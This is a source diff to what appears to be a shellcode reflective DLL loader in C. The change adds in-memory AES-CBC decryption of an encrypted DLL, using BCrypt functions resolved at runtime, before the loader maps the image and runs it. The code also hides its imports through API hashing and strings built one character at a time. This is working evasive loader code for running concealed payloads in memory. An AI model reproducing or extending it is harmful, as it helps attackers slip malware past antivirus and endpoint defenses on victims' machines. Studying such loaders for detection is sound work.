@@ -7,7 +7,10 @@
 #include <windows.h>
 #include <winternl.h>
 #include <intrin.h>
-#include <bcrypt.h>
+
+#ifdef _DEBUG
+#include "Dummy.h"
+#endif
 
 #define SRDI_CLEARHEADER 0x1
 #define SRDI_CLEARMEMORY 0x2
@@ -40,7 +43,7 @@
 #define LDRLOADDLL_HASH					0xbdbf9c13
 #define LDRGETPROCADDRESS_HASH			0x5ed941b5
 #define BCRYPTDESTROYKEYHASH			0x0D11B053
-
+#define COPYMEMORYHASH					0x25B58ABE
 
 #define HASH_KEY						13
 
@@ -68,17 +71,22 @@ typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
 typedef BOOL(WINAPI* LOCALFREE)(LPVOID);
 typedef VOID(WINAPI* SLEEP)(DWORD);
 typedef BOOLEAN(WINAPI* RTLADDFUNCTIONTABLE)(PVOID, DWORD, DWORD64);
+typedef VOID(WINAPI* COPYMEMORY)(PVOID, VOID*, SIZE_T);
 
 typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
 typedef NTSTATUS(WINAPI* LDRGETPROCADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID*);
 
-typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE);
+typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(PVOID*, LPCWSTR, LPCWSTR, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(PVOID, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(PVOID, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(PVOID, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(PVOID);
+
+typedef BOOL(WINAPI* HEAPFREE)(HANDLE, DWORD, LPVOID);
+typedef HANDLE(WINAPI* GETPROCESSHEAP)(VOID);
+typedef LPVOID(WINAPI* HEAPALLOC)(HANDLE, DWORD, SIZE_T);
 
 #pragma warning( push )
 #pragma warning( disable : 4214 ) // nonstandard extension
@@ -124,7 +132,19 @@ _wcslen(wchar_t* s) {
 	string.MaximumLength = string.Length; \
 	string.Buffer = (PCHAR)buffer
 
-ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen, DWORD flags)
+#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
+
+VOID Mcpy(unsigned char* src, unsigned char* dst, int size) {
+	for (int i = 0; i < size; dst[i++] = src[i]);
+}
+
+#ifdef _DEBUG
+ULONG_PTR LoadDLL()
+#else
+ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash, 
+	LPVOID lpUserData, DWORD nUserdataLen, DWORD cbCipherText)
+#endif
 {
 #pragma warning( push )
 #pragma warning( disable : 4055 ) // Ignore cast warnings
@@ -143,7 +163,8 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	LOCALFREE pLocalFree = NULL;
 	SLEEP pSleep = NULL;
 	RTLADDFUNCTIONTABLE pRtlAddFunctionTable = NULL;
-
+	COPYMEMORY pCopyMemory = NULL;
+	
 	BCRYPTOPENALGORITHMPROVIDER pBCryptOpenAlgorithmProvider = NULL;
 	BCRYPTGETPROPERTY pBCryptGetProperty = NULL;
 	BCRYPTSETPROPERTY pBCryptSetProperty = NULL;
@@ -151,6 +172,10 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	BCRYPTDECRYPT pBCryptDecrypt = NULL;
 	BCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = NULL;
 	BCRYPTDESTROYKEY pBCryptDestroyKey = NULL;
+
+	HEAPFREE pHeapFree = NULL;
+	GETPROCESSHEAP pGetProcessHeap = NULL;
+	HEAPALLOC pHeapAlloc = NULL;
 
 	//CHAR msg[2] = { 'a','\0' };
 	//MESSAGEBOXA pMessageBoxA = NULL;
@@ -214,6 +239,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	BYTE sFlushInstructionCache[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e' };
 	BYTE sGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o' };
 	BYTE sRtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e' };
+	BYTE sCopyMemory[] = { 'C', 'o', 'p', 'y', 'M', 'e', 'm', 'o', 'r', 'y' };
 
 	BYTE sBCryptOpenAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'O', 'p', 'e', 'n', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
 	BYTE sBCryptGetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
@@ -223,6 +249,32 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	BYTE sBCryptCloseAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'C', 'l', 'o', 's', 'e', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
 	BYTE sBCryptDestroyKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'K', 'e', 'y' };
 
+	// Heap functions for Bcrypt
+	BYTE SHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c' };
+	BYTE sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p' };
+	BYTE sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e' };
+
+	// Bcrypt macro strings
+	WCHAR sChainingModeCBC[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', 0 };
+	WCHAR sChainingMode[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 0 };
+	WCHAR sBlockLength[] = { 'B', 'l', 'o', 'c', 'k', 'L', 'e', 'n', 'g', 't', 'h', 0 };
+	WCHAR sObjectLength[] = { 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h', 0 };
+	WCHAR sAES[] = { 'A', 'E', 'S', 0 };
+	
+	// Crypto
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	BYTE rgbIV[16] = { 0 };
+	BYTE rgbAES128Key[16] = { 0 };
+	PVOID hAesAlg = NULL;
+	DWORD cbKeyObject = 0;
+	DWORD cbData = 0;
+	DWORD cbBlockLen = 0;
+	DWORD cbRawData = 0;
+	PBYTE pbKeyObject = NULL;
+	PBYTE pbIV = NULL;
+	PBYTE pbRawData = NULL;
+	PVOID hKey = NULL;
+	
 	// Import obfuscation
 	DWORD randSeed;
 	DWORD rand;
@@ -274,8 +326,23 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	//FILL_STRING_WITH_BUF(aString, sMessageBox);
 	//pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pMessageBoxA);
 
-	if (!pVirtualAlloc || !pVirtualProtect || !pSleep ||
-		!pFlushInstructionCache || !pGetNativeSystemInfo) {
+	//FILL_STRING_WITH_BUF(aString, sCopyMemory);
+	//status = pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pCopyMemory);
+	//pCopyMemory = (COPYMEMORY)GetProcAddressWithHash(COPYMEMORYHASH);
+
+	FILL_STRING_WITH_BUF(aString, sHeapFree);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapFree);
+
+	FILL_STRING_WITH_BUF(aString, sGetProcessHeap);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pGetProcessHeap);
+
+	FILL_STRING_WITH_BUF(aString, SHeapAlloc);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapAlloc);
+	
+	if (!pVirtualAlloc || !pVirtualProtect || !pSleep || /*!pCopyMemory ||*/
+		!pFlushInstructionCache || !pGetNativeSystemInfo || !pHeapFree ||
+		!pGetProcessHeap || !pHeapAlloc) 
+	{
 		return 0;
 	}
 
@@ -303,22 +370,148 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
 	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);
 
-	//// WTF
+	/// WTF
 	pBCryptDestroyKey = (BCRYPTDESTROYKEY)GetProcAddressWithHash(BCRYPTDESTROYKEYHASH);
 	//FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
 	//pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);
-	//// END OF WTF
-
+	/// END OF WTF
+		
 	if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey ||
-		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) {
+		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) 
+	{
 		return 0;
 	}
 
+
 	///
-	// STEP 2: load our image into a new permanent location in memory
+	// STEP 2: Decrypt dll
+	///
+	
+	// Copy key and iv from the first 32 bytes of cipher text
+	//pCopyMemory(rgbAES128Key, pbCipherText, 16);
+	//pCopyMemory(rgbIV, &pbCipherText[16], 16);
+	Mcpy(pbCipherText, rgbAES128Key, 16);
+	Mcpy(&pbCipherText[16], rgbIV, 16);
+
+	// Open an algorithm handle.	
+	if (!NT_SUCCESS(status = pBCryptOpenAlgorithmProvider(
+		&hAesAlg,
+		sAES,
+		NULL,
+		0)))
+	{
+		goto Cleanup;
+	}
+	
+	// Calculate the size of the buffer to hold the KeyObject.
+	if (!NT_SUCCESS(status = pBCryptGetProperty(
+		hAesAlg,
+		sObjectLength,
+		(PBYTE)&cbKeyObject,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		goto Cleanup;
+	}
+
+	// Allocate the key object on the heap.
+	pbKeyObject = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbKeyObject);
+
+	// Calculate the block length for the IV.
+	if (!NT_SUCCESS(status = pBCryptGetProperty(
+		hAesAlg,
+		sBlockLength,
+		(PBYTE)&cbBlockLen,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		goto Cleanup;
+	}
+
+	// Determine whether the cbBlockLen is not longer than the IV length.
+	if (cbBlockLen > sizeof(rgbIV))
+	{
+		goto Cleanup;
+	}
+
+	// Allocate a buffer for the IV. The buffer is consumed during the 
+	// encrypt/decrypt process.
+	pbIV = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbBlockLen);
+	if (NULL == pbIV)
+	{
+		goto Cleanup;
+	}
+
+	//pCopyMemory(pbIV, rgbIV, cbBlockLen);
+	Mcpy(rgbIV, pbIV, 16);
+
+	if (!NT_SUCCESS(status = pBCryptSetProperty(
+		hAesAlg,
+		sChainingMode,
+		(PBYTE)sChainingModeCBC,
+		sizeof(sChainingModeCBC),
+		0)))
+	{
+		goto Cleanup;
+	}
+
+	// Generate the key from supplied input key bytes.
+	if (!NT_SUCCESS(status = pBCryptGenerateSymmetricKey(
+		hAesAlg,
+		&hKey,
+		pbKeyObject,
+		cbKeyObject,
+		(PBYTE)rgbAES128Key,
+		sizeof(rgbAES128Key),
+		0)))
+	{
+		goto Cleanup;
+	}
+
+	// Get the output buffer size.
+	if (!NT_SUCCESS(status = pBCryptDecrypt(
+		hKey,
+		&pbCipherText[32],
+		cbCipherText - 32,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		NULL,
+		0,
+		&cbRawData,
+		0x00000001)))  // BCRYPT_BLOCK_PADDING
+	{
+		goto Cleanup;
+	}
+
+	pbRawData = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbRawData);
+	if (NULL == pbRawData)
+	{
+		goto Cleanup;
+	}
+
+	if (!NT_SUCCESS(status = pBCryptDecrypt(
+		hKey,
+		&pbCipherText[32],
+		cbCipherText - 32,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		pbRawData,
+		cbRawData,
+		&cbRawData,
+		0x00000001)))  // BCRYPT_BLOCK_PADDING
+	{
+		goto Cleanup;
+	}
+
+	///
+	// STEP 3: load our image into a new permanent location in memory
 	///
 
-	ntHeaders = RVA(PIMAGE_NT_HEADERS, dllData, ((PIMAGE_DOS_HEADER)dllData)->e_lfanew);
+	ntHeaders = RVA(PIMAGE_NT_HEADERS, pbRawData, ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew);
 
 	// Perform sanity checks on the image (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)
 
@@ -373,28 +566,28 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 
 	// Copy over the headers
 
-	((PIMAGE_DOS_HEADER)baseAddress)->e_lfanew = ((PIMAGE_DOS_HEADER)dllData)->e_lfanew;
+	((PIMAGE_DOS_HEADER)baseAddress)->e_lfanew = ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew;
 
-	for (i = ((PIMAGE_DOS_HEADER)dllData)->e_lfanew; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
-		((PBYTE)baseAddress)[i] = ((PBYTE)dllData)[i];
+	for (i = ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
+		((PBYTE)baseAddress)[i] = ((PBYTE)pbRawData)[i];
 	}
 
 	ntHeaders = RVA(PIMAGE_NT_HEADERS, baseAddress, ((PIMAGE_DOS_HEADER)baseAddress)->e_lfanew);
 
 	///
-	// STEP 3: Load in the sections
+	// STEP 4: Load in the sections
 	///
 
 	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
 
 	for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
 		for (c = 0; c < sectionHeader->SizeOfRawData; c++) {
-			((PBYTE)(baseAddress + sectionHeader->VirtualAddress))[c] = ((PBYTE)(dllData + sectionHeader->PointerToRawData))[c];
+			((PBYTE)(baseAddress + sectionHeader->VirtualAddress))[c] = ((PBYTE)(pbRawData + sectionHeader->PointerToRawData))[c];
 		}
 	}
 
 	///
-	// STEP 4: process all of our images relocations (assuming we missed the preferred address)
+	// STEP 5: process all of our images relocations (assuming we missed the preferred address)
 	///
 
 	baseOffset = baseAddress - ntHeaders->OptionalHeader.ImageBase;
@@ -425,11 +618,11 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	}
 
 	///
-	// STEP 5: process our import table
+	// STEP 6: process our import table
 	///
 
 	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-	randSeed = (DWORD)((ULONGLONG)dllData);
+	randSeed = (DWORD)((ULONGLONG)pbRawData);
 
 	if (dataDir->Size) {
 
@@ -482,7 +675,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	}
 
 	///
-	// STEP 6: process our delayed import table
+	// STEP 7: process our delayed import table
 	///
 
 	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
@@ -510,9 +703,8 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 		}
 	}
 
-
 	///
-	// STEP 7: Finalize our sections. Set memory protections.
+	// STEP 8: Finalize our sections. Set memory protections.
 	///
 
 	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
@@ -561,7 +753,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	pFlushInstructionCache((HANDLE)-1, NULL, 0);
 
 	///
-	// STEP 8: Execute TLS callbacks
+	// STEP 9: Execute TLS callbacks
 	///
 
 	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
@@ -577,7 +769,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	}
 
 	///
-	// STEP 9: Register exception handlers (x64 only)
+	// STEP 10: Register exception handlers (x64 only)
 	///
 
 #ifdef _WIN64
@@ -591,14 +783,14 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 #endif
 
 	///
-	// STEP 10: call our images entry point
+	// STEP 11: call our images entry point
 	///
 
 	dllMain = RVA(DLLMAIN, baseAddress, ntHeaders->OptionalHeader.AddressOfEntryPoint);
 	dllMain((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, (LPVOID)1);
 
 	///
-	// STEP 11: call our exported function
+	// STEP 12: call our exported function
 	///
 
 	if (dwFunctionHash) {
@@ -640,9 +832,26 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 		} while (0);
 	}
 
+Cleanup:
+
+	if (hAesAlg)
+		pBCryptCloseAlgorithmProvider(hAesAlg, 0);
+
+	if (hKey)
+		pBCryptDestroyKey(hKey);
+
+	if (pbIV)
+		pHeapFree(pGetProcessHeap(), 0, pbIV);
+
+	if (pbKeyObject)
+		pHeapFree(pGetProcessHeap(), 0, pbKeyObject);
+
+	if (pbRawData)
+		pHeapFree(pGetProcessHeap(), 0, pbRawData);
+
 	if (pVirtualFree && pLocalFree) {
-		if (!pVirtualFree((LPVOID)dllData, 0, 0x8000))
-			pLocalFree((LPVOID)dllData);
+		if (!pVirtualFree((LPVOID)pbRawData, 0, 0x8000))
+			pLocalFree((LPVOID)pbRawData);
 	}
 
 	// Atempt to return a handle to the module
